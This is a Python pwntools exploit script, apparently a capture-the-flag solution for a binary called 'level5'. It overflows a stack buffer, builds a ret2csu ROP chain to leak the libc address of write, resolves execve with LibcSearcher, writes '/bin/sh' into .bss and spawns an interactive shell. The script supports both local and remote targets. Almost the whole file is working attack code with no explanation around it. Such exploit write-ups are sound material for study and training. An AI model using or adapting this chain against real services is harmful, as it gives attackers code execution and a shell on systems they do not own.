from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'level5'
elf = ELF(program,checksec=False)
lokal = True

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

uu64 = lambda x: u64(x.ljust(8,"\x00"))
uu32 = lambda x: u32(x.ljust(4,"\x00"))

if lokal:
    s = elf.process()
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
    host = ''
    port = ''
    s = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    cmd = ""
    gdb.attach(s,cmd)

#Exploit Here
pad = "A"*136
writegot = elf.got['write']
readgot= elf.got['read']
main = elf.symbols['main']
bss = elf.bss()
csu_front_addr = 0x0000000000400600 #mulai dari mov rdx,r13
csu_end_addr = 0x000000000040061a #pop rbx dst

def csu(rbx,rbp,r12,r13,r14,r15,last):
	p = pad
	p += p64(csu_end_addr)
	p += p64(rbx)
	p += p64(rbp)
	p += p64(r12)
	p += p64(r13)
	p += p64(r14)
	p += p64(r15)
	p += p64(csu_front_addr)
	p += "\x90"*56
	p += p64(last)
	s.send(p)

s.recvuntil("World\n")
csu(0,1,writegot,8,writegot,1,main)
leak = uu64(s.recv(8))

libc = LibcSearcher('write', leak)

libcbase = leak - libc.dump('write')
log.info("Libc Base : {}".format(hex(libcbase)))
execve = libcbase + libc.dump('execve')
log.info("execve : {}".format(hex(execve)))

s.recvuntil("World\n")
csu(0,1,readgot,16,bss,0,main)
s.send(p64(execve)+"/bin/sh\x00")
s.recvuntil("World\n")
csu(0,1,bss,0,0,bss+8,main)

s.interactive()
